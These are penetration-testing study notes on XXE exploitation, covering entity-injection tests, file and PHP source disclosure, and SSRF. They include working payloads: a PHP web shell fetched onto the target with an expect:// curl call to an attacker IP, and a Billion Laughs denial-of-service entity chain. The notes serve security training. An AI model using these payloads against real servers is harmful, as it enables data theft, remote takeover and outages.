# Local File Disclosure (XXE Exploitation)

## Core idea
- If a web app trusts **unfiltered XML input** and displays back entity values, we can define **external entities** referencing local files — their content gets disclosed when the entity is rendered.

---

## Identifying XXE

### Step 1 — Find XML input points
- Example: a **Contact Form** that, when intercepted in Burp, sends data as **XML** to `/submitDetails.php`.
- Any endpoint accepting XML is a potential XXE target, especially if the app uses **outdated XML libraries** with no input sanitization.

### Step 2 — Find a reflected element
- Submit the form normally, observe which XML element's value is **echoed back** in the response.
- Example: the `<email>` element's value appears in the response message (`"Check your email <value> for further instructions."`).
- Knowing which element reflects is key — that's where you'll inject the entity reference.

### Step 3 — Test for internal entity injection
- Add a **DOCTYPE + internal ENTITY** declaration (if no DOCTYPE exists yet in the request, add one; if one exists, just add the `ENTITY` line):
  ```xml
  <!DOCTYPE email [
    <!ENTITY company "Inlane Freight">
  ]>
  ```
- Replace the reflected element's value with `&company;`.
- **Vulnerable app:** response shows `Inlane Freight` (the entity's value).
- **Non-vulnerable app:** would show the raw literal text `&company;` instead.
- This confirms the parser **processes DTDs/entities** → confirmed XXE.

> **Tip:** Even if an app normally sends JSON, try changing `Content-Type` to `application/xml` and converting the JSON body to XML — some backends still accept and parse XML even if the front-end defaults to JSON.

---

## Reading Sensitive Files

- Switch the internal entity to an **external** one using `SYSTEM`:
  ```xml
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "file:///etc/passwd">
  ]>
  ```
- Reference `&company;` in the reflected element → response now contains the **contents of `/etc/passwd`**.
- **Impact:** can read sensitive files — config files with passwords, SSH private keys (`id_rsa`), etc., which may lead to full server access (see File Inclusion / Directory Traversal module for follow-on attacks).
- **Tip:** In some **Java** web apps, referencing a **directory** instead of a file can return a **directory listing** — useful for recon.

---

## Reading Source Code

- Directly referencing a source file (e.g. `index.php`) often **fails** — if the file contains XML special characters (`<`, `>`, `&`) or binary data, it **breaks the XML structure** of the entity reference.
- **PHP-specific workaround:** use the `php://filter` wrapper to **base64-encode** the file content so it doesn't break XML syntax:
  ```xml
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  ]>
  ```
- Response contains a **base64 string** — decode it (e.g. via Burp's Inspector) to recover the source file.
- **Limitation:** this trick is **PHP-specific**. A more universal method for other frameworks is covered later in the module (OOB/Out-of-Band XXE, implied).

## Remote Code Execution (RCE) with XXE

- Beyond file reads, XXE can sometimes lead to **code execution**:
  - Look for **SSH keys** to gain server access.
  - On **Windows** back-ends, attempt **hash-stealing** techniques via outbound calls to attacker-controlled servers.
  - On **PHP**, the `php://expect` filter can allow command execution — **requires the PHP `expect` module** to be installed/enabled (not default on modern PHP).

### Basic command execution (if expect module enabled)
- If XXE output is reflected, a simple command like `expect://id` can have its output printed directly.
- Complex commands (e.g. reverse shells) often **break XML syntax** and fail.

### More reliable RCE: deliver a web shell
1. Create a simple PHP web shell and serve it locally:
   ```bash
   echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
   sudo python3 -m http.server 80
   ```
2. Use XXE to make the target **curl-download** the shell via `expect://`:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE email [
     <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
   ]>
   <root>
   <name></name>
   <tel></tel>
   <email>&company;</email>
   <message></message>
   </root>
   ```
   - Spaces replaced with `$IFS` (to avoid breaking XML attribute/content syntax).
   - Characters like `|`, `>`, `{` should be avoided as they can also break the XML.
3. On success, the attacker's web server receives a request for `shell.php` → the shell is now present on the target, enabling **interactive remote command execution**.

> **Note:** The `expect` module isn't installed/enabled by default on modern PHP setups, so this specific RCE path often **won't work** in practice. This is why XXE is more commonly used for **file/source disclosure**, which can reveal *other* paths to code execution.

## Other XXE Attack Types

### SSRF via XXE
- External entities can reference **internal URLs**, enabling **port scanning** and access to internal-only pages — same techniques as SSRF (covered in the Server-Side Attacks module).

### Denial of Service (Billion Laughs-style attack)
- Uses **nested self-referencing entities** that exponentially expand in memory:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY a0 "DOS" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    ... (continues up to a10)
  ]>
  <root>
  <name></name>
  <tel></tel>
  <email>&a10;</email>
  <message></message>
  </root>
  ```
  - Each entity references the previous one 10x → exponential blowup → server **runs out of memory**.
- **Modern web servers (e.g. Apache) generally protect against this** via entity-expansion limits, so this attack often no longer works — but worth testing.

## Summary table

| Goal | Technique | Key requirement/limitation |
|---|---|---|
| Confirm XXE | Internal `ENTITY` reflected in response | Need a reflected XML element |
| Read local files | `SYSTEM "file:///path"` | File content must not break XML syntax |
| Read source code (PHP) | `SYSTEM "php://filter/convert.base64-encode/resource=file"` | PHP-only |
| RCE (basic) | `SYSTEM "expect://cmd"` | Requires `php://expect` module enabled |
| RCE (reliable) | `expect://curl` to fetch a web shell | Requires outbound connectivity + expect module |
| SSRF | External entity referencing internal URLs | Same as general SSRF technique |
| DoS | Nested self-referencing entities ("Billion Laughs") | Often mitigated by modern servers |

## Key takeaways
1. XXE exploitation starts with finding a **reflected element** to confirm entity processing.
2. `file://` and `php://filter` are core techniques for **local file and source code disclosure**.
3. RCE via XXE is possible but **environment-dependent** (requires specific modules like PHP's `expect`) — file/source disclosure is the more reliable and common outcome.
4. XXE isn't limited to file reads — it can also enable **SSRF** and **DoS**, making it a versatile and high-impact vulnerability class.
